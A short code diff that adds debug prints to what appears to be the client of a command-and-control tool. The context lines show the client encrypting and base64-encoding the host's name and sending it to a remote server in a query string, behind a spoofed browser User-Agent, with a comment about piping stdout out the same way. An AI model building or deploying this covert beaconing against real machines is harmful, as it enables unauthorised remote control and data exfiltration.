@@ -107,8 +107,10 @@ def connect_trevor():
         time.sleep(1)
         try:
             hostname_send  = cipher.encrypt("magic_hostname=" + hostname).encode('utf-8')
+            print("Plain: %s"%(hostname_send))
             hostname_send = base64.b64encode(hostname_send).decode('utf-8')
 
+            print(hostname_send)
             # pipe out stdout and base64 encode it then request via a query string parameter
             if py == "3":
                 req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
